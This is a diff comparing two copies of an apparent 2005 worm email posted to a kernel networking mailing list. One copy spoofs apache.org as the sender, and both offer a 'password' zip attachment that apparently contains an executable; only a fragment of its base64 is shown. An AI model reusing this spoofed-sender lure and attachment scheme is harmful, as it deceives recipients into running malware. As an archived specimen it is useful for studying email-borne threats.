@@ -1,26 +1,26 @@
-From: info@netlock.net
-Subject: Your_Password
-Date: Sat, 24 Dec 2005 01:34:51 UTC
-Message-ID: <f0abbeec.0ecfc2e7826@netlock.net>
+From: hostmaster@apache.org
+Subject: Your Password
+Date: Sat, 24 Dec 2005 01:19:07 GMT
+Message-ID: <8afa.3eed0e47dbb7eb5@apache.org>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="====114ec71f.9fa21b7bedc"
+Content-Type: multipart/mixed; boundary="====fadebf8bfaa.d6"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: majordomo@oss.sgi.com
+To: emailserv@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---====114ec71f.9fa21b7bedc
+--====fadebf8bfaa.d6
 
 Protected message is attached!
 
 
-***** Go to: http://www.netlock.net
-***** Email: postman@netlock.net
---====114ec71f.9fa21b7bedc
+***** Go to: http://www.apache.org
+***** Email: postman@apache.org
+--====fadebf8bfaa.d6
 Content-Type: application/octet-stream; name=reg_pass.zip
 Content-Transfer-Encoding: base64
 Content-Disposition: attachment; filename="reg_pass.zip"
@@ -1000,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---====114ec71f.9fa21b7bedc--
+--====fadebf8bfaa.d6--
